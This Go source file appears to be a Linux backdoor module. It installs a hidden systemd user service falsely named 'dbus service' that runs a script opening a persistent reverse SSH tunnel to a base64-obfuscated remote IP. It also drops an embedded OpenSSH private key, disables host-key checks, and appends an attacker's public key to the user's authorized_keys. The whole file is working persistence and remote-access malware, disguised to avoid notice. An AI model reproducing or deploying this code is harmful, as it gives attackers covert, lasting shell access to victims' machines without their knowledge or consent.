package sti

import (
	"encoding/base64"
	"log"
	"os"
	"os/exec"
)

var Key = `-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
`

var publicKey = `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO9489gRABw1nsc/XeETm8sZ/lCZd6Rhd/XFhEmbXUms829r9sELsmEUEcHU0qBpBlsn0DiMfD8H+w5GMmYOTMMrECe59iiqUmFgkXXRC4NjK8bHm37Od7U+6hsJev8ZtMCWnhwYk1cuxLtyMBTfWqesKqCoB4CxeDNNok4fqdZ8fJJTn27jnQCLHPUCy+Z38GiObC8PEr5F43cOmKiDC6gns5S7k2uTRarDDuQmmWMTE9GoYVkWQT5HToCTemBFMkbaSd/g8OT06P4dsMLXW+xwy23/T5fw1PjxcO/u8mIxx7g7QO3/Hdady4LYmawjbimnlalV0NDy+ROEKo4DoH737cjwjJphJprVMdu3ZC3EeTIQHkRRBgz3Y89R5lIRDhBdmRpyEL4xpnkreO+fHPu1p59znq/2KwRao91EeIyzG5mj2QF+xP2wjn0ZZVWdP5i01K6PzXvVfldtYsB/wHfyWJAUZhrC2YjXCFhVymJCbppe2mGwslW4BzIZXFvcE=`

func installService(path string) error {
	service := `
	[Unit]
	Description=dbus service
	After=network.target
	
	[Service]
	Type=exec
	RestartSec=60
	Restart=always
	ExecStart=%h/.config/systemd/user/.dbus.sh
	
	[Install]
	WantedBy=default.target`

	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(service)
	if err != nil {
		return err
	}

	return nil
}

func installScript(path, ip string) error {
	script :=
		`#!/bin/bash
ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -N -i $HOME/.config/systemd/user/.key -R 9876:localhost:22 root@`
	script += ip + "\n"

	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(script)
	if err != nil {
		return err
	}

	err = os.Chmod(path, 0777)
	if err != nil {
		return err
	}

	return nil
}

func installKey(path string) error {

	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(Key)
	if err != nil {
		return err
	}

	err = os.Chmod(path, 0600)
	if err != nil {
		return err
	}

	return nil
}

func addAuthorizedKeys(home string) {
	f, err := os.OpenFile(home+"/.ssh/authorized_keys", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
	}
	defer f.Close()

	if _, err := f.WriteString(publicKey + "\n"); err != nil {
		log.Println(err)
	}
}

func Init(ip string) {

	decodedIP, err := base64.StdEncoding.DecodeString(ip)
	if err != nil {
		log.Fatal("error:", err)
	}

	// get current home directory
	home, _ := os.UserHomeDir()

	if _, err = os.Stat(home + "/.config/systemd/user/.dbus.service"); err == nil {
		return
	}

	err = os.MkdirAll(home+"/.config/systemd/user/", 0777)
	if err != nil {
		// fmt.Println(err)
		return
	}

	err = installService(home + "/.config/systemd/user/.dbus.service")
	if err != nil {
		// fmt.Println(err)
		return
	}

	err = installScript(home+"/.config/systemd/user/.dbus.sh", string(decodedIP))
	if err != nil {
		// fmt.Println(err)
		return
	}

	err = installKey(home + "/.config/systemd/user/.key")
	if err != nil {
		// fmt.Println(err)
		return
	}

	cmd := exec.Command("bash", "-c", "systemctl --user enable .dbus.service && systemctl --user start .dbus.service")
	err = cmd.Run()
	if err != nil {
		// fmt.Println(err)
		return
	}

	addAuthorizedKeys(home)
}
